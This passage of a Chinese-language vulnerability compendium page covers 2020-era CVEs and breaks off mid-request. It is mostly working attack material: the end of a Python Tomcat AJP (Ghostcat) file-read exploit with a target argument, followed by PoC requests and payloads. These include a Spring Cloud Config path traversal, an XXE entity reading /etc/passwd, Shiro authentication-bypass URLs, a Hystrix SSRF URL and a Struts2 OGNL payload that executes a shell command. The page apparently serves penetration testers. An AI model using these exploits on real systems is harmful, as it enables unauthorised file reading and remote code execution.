self.attributes:</span><br><span class="line">			a_name = attr[<span class="string">'name'</span>]</span><br><span class="line">			code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">			res += struct.pack(<span class="string">"b"</span>, code)</span><br><span class="line">			<span class="keyword">if</span> a_name == <span class="string">"req_attribute"</span>:</span><br><span class="line">				aa_name, a_value = attr[<span class="string">'value'</span>]</span><br><span class="line">				res += pack_string(aa_name)</span><br><span class="line">				res += pack_string(a_value)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(attr[<span class="string">'value'</span>])</span><br><span class="line">		res += struct.pack(<span class="string">"B"</span>, <span class="number">0xFF</span>)</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self)</span>:</span></span><br><span class="line">		res = <span class="string">""</span></span><br><span class="line">		res = struct.pack(<span class="string">"bb"</span>, self.prefix_code, self.method)</span><br><span class="line">		res += pack_string(self.protocol)</span><br><span class="line">		res += pack_string(self.req_uri)</span><br><span class="line">		res += pack_string(self.remote_addr)</span><br><span class="line">		res += pack_string(self.remote_host)</span><br><span class="line">		res += pack_string(self.server_name)</span><br><span class="line">		res += struct.pack(<span class="string">"&gt;h"</span>, self.server_port)</span><br><span class="line">		res += struct.pack(<span class="string">"?"</span>, self.is_ssl)</span><br><span class="line">		res += self.pack_headers()</span><br><span class="line">		res += self.pack_attributes()</span><br><span class="line">		<span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">"&gt;bbh"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">"&gt;bbh"</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, raw_packet)</span>:</span></span><br><span class="line">		stream = StringIO(raw_packet)</span><br><span class="line">		self.magic1, self.magic2, data_len = unpack(stream, <span class="string">"bbH"</span>)</span><br><span class="line">		self.prefix_code, self.method = unpack(stream, <span class="string">"bb"</span>)</span><br><span class="line">		self.protocol = unpack_string(stream)</span><br><span class="line">		self.req_uri = unpack_string(stream)</span><br><span class="line">		self.remote_addr = unpack_string(stream)</span><br><span class="line">		self.remote_host = unpack_string(stream)</span><br><span class="line">		self.server_name = unpack_string(stream)</span><br><span class="line">		self.server_port = unpack(stream, <span class="string">"&gt;h"</span>)</span><br><span class="line">		self.is_ssl = unpack(stream, <span class="string">"?"</span>)</span><br><span class="line">		self.num_headers, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">		self.request_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">			<span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">				h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = unpack(stream, <span class="string">"%ds"</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">			h_value = unpack_string(stream)</span><br><span class="line">			self.request_headers[h_name] = h_value</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span><span class="params">(self, socket, stream, save_cookies=False)</span>:</span></span><br><span class="line">		res = []</span><br><span class="line">		i = socket.sendall(self.serialize())</span><br><span class="line">		<span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">		r = AjpResponse.receive(stream)</span><br><span class="line">		<span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">		res.append(r)</span><br><span class="line">		<span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">'Set-Cookie'</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">			self.headers[<span class="string">'SC_REQ_COOKIE'</span>] = r.response_headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"></span><br><span class="line">		<span class="comment"># read body chunks and end response packets</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			res.append(r)</span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">raise</span> NotImplementedError</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpResponse</span><span class="params">(object)</span>:</span></span><br><span class="line">	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(<span class="number">7</span>)</span><br><span class="line">	COMMON_SEND_HEADERS = [</span><br><span class="line">			<span class="string">"Content-Type"</span>, <span class="string">"Content-Language"</span>, <span class="string">"Content-Length"</span>, <span class="string">"Date"</span>, <span class="string">"Last-Modified"</span>,</span><br><span class="line">			<span class="string">"Location"</span>, <span class="string">"Set-Cookie"</span>, <span class="string">"Set-Cookie2"</span>, <span class="string">"Servlet-Engine"</span>, <span class="string">"Status"</span>, <span class="string">"WWW-Authenticate"</span></span><br><span class="line">			]</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">		<span class="comment"># read headers</span></span><br><span class="line">		self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">"&gt;HHb"</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">			self.parse_send_headers(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">			self.parse_send_body_chunk(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">			self.parse_end_response(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">			self.parse_get_body_chunk(stream)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse_send_headers</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">		self.http_status_code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">		self.http_status_msg = unpack_string(stream)</span><br><span class="line">		self.num_headers, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">		self.response_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">			<span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">				h_name, = unpack(stream, <span class="string">"%ds"</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = AjpResponse.COMMON_SEND_HEADERS[code<span class="number">-0xA001</span>]</span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse_send_body_chunk</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">		self.data_length, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">		self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse_end_response</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">		self.reuse, = unpack(stream, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse_get_body_chunk</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">		rlen, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">		<span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">receive</span><span class="params">(stream)</span>:</span></span><br><span class="line">		r = AjpResponse()</span><br><span class="line">		r.parse(stream)</span><br><span class="line">		<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_ajp_forward_request</span><span class="params">(target_host, req_uri, method=AjpForwardRequest.GET)</span>:</span></span><br><span class="line">	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">	fr.method = method</span><br><span class="line">	fr.protocol = <span class="string">"HTTP/1.1"</span></span><br><span class="line">	fr.req_uri = req_uri</span><br><span class="line">	fr.remote_addr = target_host</span><br><span class="line">	fr.remote_host = <span class="literal">None</span></span><br><span class="line">	fr.server_name = target_host</span><br><span class="line">	fr.server_port = <span class="number">80</span></span><br><span class="line">	fr.request_headers = &#123;</span><br><span class="line">		<span class="string">'SC_REQ_ACCEPT'</span>: <span class="string">'text/html'</span>,</span><br><span class="line">		<span class="string">'SC_REQ_CONNECTION'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">		<span class="string">'SC_REQ_CONTENT_LENGTH'</span>: <span class="string">'0'</span>,</span><br><span class="line">		<span class="string">'SC_REQ_HOST'</span>: target_host,</span><br><span class="line">		<span class="string">'SC_REQ_USER_AGENT'</span>: <span class="string">'Mozilla'</span>,</span><br><span class="line">		<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">		<span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.5'</span>,</span><br><span class="line">		<span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">		<span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span></span><br><span class="line">	&#125;</span><br><span class="line">	fr.is_ssl = <span class="literal">False</span></span><br><span class="line">	fr.attributes = []</span><br><span class="line">	<span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target_host, target_port)</span>:</span></span><br><span class="line">		self.target_host = target_host</span><br><span class="line">		self.target_port = target_port</span><br><span class="line"></span><br><span class="line">		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">		self.socket.connect((target_host, target_port))</span><br><span class="line">		self.stream = self.socket.makefile(<span class="string">"rb"</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">perform_request</span><span class="params">(self, req_uri, headers=&#123;&#125;, method=<span class="string">'GET'</span>, user=None, password=None, attributes=[])</span>:</span></span><br><span class="line">		self.req_uri = req_uri</span><br><span class="line">		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">		print(<span class="string">"Getting resource at ajp13://%s:%d%s"</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">		<span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			self.forward_request.request_headers[<span class="string">'SC_REQ_AUTHORIZATION'</span>] = <span class="string">"Basic "</span> + (<span class="string">"%s:%s"</span> % (user, password)).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">		<span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">			self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">		<span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">			self.forward_request.attributes.append(a)</span><br><span class="line">		responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">		<span class="keyword">if</span> len(responses) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">		snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">		data_res = responses[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">if</span> len(data_res) == <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">"No data in response. Headers:%s\n"</span> % snd_hdrs_res.response_headers)</span><br><span class="line">		<span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"target"</span>, type=str, help=<span class="string">"Hostname or IP to attack"</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=int, default=<span class="number">8009</span>, help=<span class="string">"AJP port to attack (default is 8009)"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-f"</span>, <span class="string">'--file'</span>, type=str, default=<span class="string">'WEB-INF/web.xml'</span>, help=<span class="string">"file path :(WEB-INF/web.xml)"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">'/asdf'</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.request_uri'</span>,<span class="string">'/'</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.path_info'</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">'name'</span>:<span class="string">'req_attribute'</span>,<span class="string">'value'</span>:[<span class="string">'javax.servlet.include.servlet_path'</span>,<span class="string">'/'</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line">print(<span class="string">'----------------------------'</span>)</span><br><span class="line">print(<span class="string">""</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure>

<h4 id="8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484"><a href="#8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484" class="headerlink" title="8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484"></a>8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484</h4><p><strong>参考：</strong><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106937171" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106937171</a> <a href="https://xz.aliyun.com/t/7803#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7803#toc-1</a></p>
<h4 id="9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660"><a href="#9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660" class="headerlink" title="9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660"></a>9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660</h4><h2 id="四、框架"><a href="#四、框架" class="headerlink" title="四、框架"></a>四、框架</h2><h3 id="JAVA："><a href="#JAVA：" class="headerlink" title="JAVA："></a>JAVA：</h3><h4 id="1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"><a href="#1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398" class="headerlink" title="1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"></a>1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20-</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.248.129:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.cnblogs.com/Sylon/p/12700849.html" target="_blank" rel="noopener">https://www.cnblogs.com/Sylon/p/12700849.html</a></p>
<h4 id="2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421"><a href="#2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421" class="headerlink" title="2、Spring Framework反射型文件下载漏洞 CVE-2020-5421"></a>2、Spring Framework反射型文件下载漏洞 CVE-2020-5421</h4><p>参考：<a href="https://xz.aliyun.com/t/8341?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8341?page=5</a> </p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247495382&amp;idx=3&amp;sn=21e43c186df31d9df263d211b4af208a&amp;chksm=fa3aae0ccd4d271a3e848e6ad5820a3867c1a2e1f7376af12aadb0b946d5814c548f7f1e01ac&amp;scene=0&amp;xtrack=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247495382&amp;idx=3&amp;sn=21e43c186df31d9df263d211b4af208a&amp;chksm=fa3aae0ccd4d271a3e848e6ad5820a3867c1a2e1f7376af12aadb0b946d5814c548f7f1e01ac&amp;scene=0&amp;xtrack=1#rd</a></p>
<h4 id="3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410"><a href="#3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410" class="headerlink" title="3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410"></a>3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip:8889&#x2F;flag.txt%23&#x2F;222&#x2F;..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</span><br></pre></td></tr></table></figure>

<p><strong>参考：</strong><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
<h4 id="4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF"><a href="#4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF" class="headerlink" title="4、Spring Cloud Netflix Hystrix Dashboard SSRF"></a>4、Spring Cloud Netflix Hystrix Dashboard SSRF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proxy.stream?origin&#x3D;http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>

<h4 id="5、Apache-Cocoon-XML注入-cve-2020-11991"><a href="#5、Apache-Cocoon-XML注入-cve-2020-11991" class="headerlink" title="5、Apache Cocoon XML注入 cve-2020-11991"></a>5、Apache Cocoon XML注入 cve-2020-11991</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version="1.0" ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnblogs.com/Yang34/p/13665674.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13665674.html</a></p>
<h4 id="6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933"><a href="#6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933" class="headerlink" title="6、Apache Shiro 权限绕过漏洞 CVE-2020-13933"></a>6、Apache Shiro 权限绕过漏洞 CVE-2020-13933</h4><h4 id="7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989"><a href="#7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989" class="headerlink" title="7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989"></a>7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;;&#x2F;admin&#x2F;index</span><br><span class="line"> http:&#x2F;&#x2F;localhost:8080&#x2F;admin&#x2F;index&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>参考：</strong><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p>
<h4 id="8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995"><a href="#8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995" class="headerlink" title="8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995"></a>8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995</h4><h4 id="9、Apache-Dubbo反序列化漏洞-CVE-2020-1948"><a href="#9、Apache-Dubbo反序列化漏洞-CVE-2020-1948" class="headerlink" title="9、Apache Dubbo反序列化漏洞 CVE-2020-1948"></a>9、Apache Dubbo反序列化漏洞 CVE-2020-1948</h4><h4 id="10、Apache-Dubbo反序列化漏洞-CVE-2019-1756"><a href="#10、Apache-Dubbo反序列化漏洞-CVE-2019-1756" class="headerlink" title="10、Apache Dubbo反序列化漏洞 CVE-2019-1756"></a>10、Apache Dubbo反序列化漏洞 CVE-2019-1756</h4><h4 id="11、Struts2远程代码执行漏洞-CVE-2019-0230"><a href="#11、Struts2远程代码执行漏洞-CVE-2019-0230" class="headerlink" title="11、Struts2远程代码执行漏洞 CVE-2019-0230"></a>11、Struts2远程代码执行漏洞 CVE-2019-0230</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">poc1:</span></span><br><span class="line">http://ip:port/test-S2-059.action?payload=%25%7b%31%2b%34%7d%0a</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">poc2:</span></span><br><span class="line">POST /s2_059/index.action HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8085</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 606</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:8085</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:8085/s2_059_war/</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=272825C954147516F847095B055202B5; JSESSIONID=01F82222F5CCED3DC9B7819AE6C98DA0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://paper.seebug.org/1331/" target="_blank" rel="noopener">https://paper.seebug.org/1331/</a></p>
<h4 id="12、Jackson-多个反序列化安全漏洞-CVE-2020-24616"><a href="#12、Jackson-多个反序列化安全漏洞-CVE-2020-24616" class="headerlink" title="12、Jackson 多个反序列化安全漏洞 CVE-2020-24616"></a>12、Jackson 多个反序列化安全漏洞 CVE-2020-24616</h4><h4 id="13、Fastjson-lt-1-2-68-远程命令执行漏洞"><a href="#13、Fastjson-lt-1-2-68-远程命令执行漏洞" class="headerlink" title="13、Fastjson &lt;= 1.2.68 远程命令执行漏洞"></a>13、Fastjson &lt;= 1.2.68 远程命令执行漏洞</h4><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="1、ThinkPHP-3-x注入漏洞"><a href="#1、ThinkPHP-3-x注入漏洞" class="headerlink" title="1、ThinkPHP 3.x注入漏洞"></a>1、ThinkPHP 3.x注入漏洞</h4><h4 id="2、ThinkPHP-6-任意文件操作漏洞"><a href="#2、ThinkPHP-6-任意文件操作漏洞" class="headerlink" title="2、ThinkPHP 6 任意文件操作漏洞"></a>2、ThinkPHP 6 任意文件操作漏洞</h4><p>备注：2020年1月老漏洞</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tp6/public/index.php/index/test1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 24</span><br><span class="line"><span 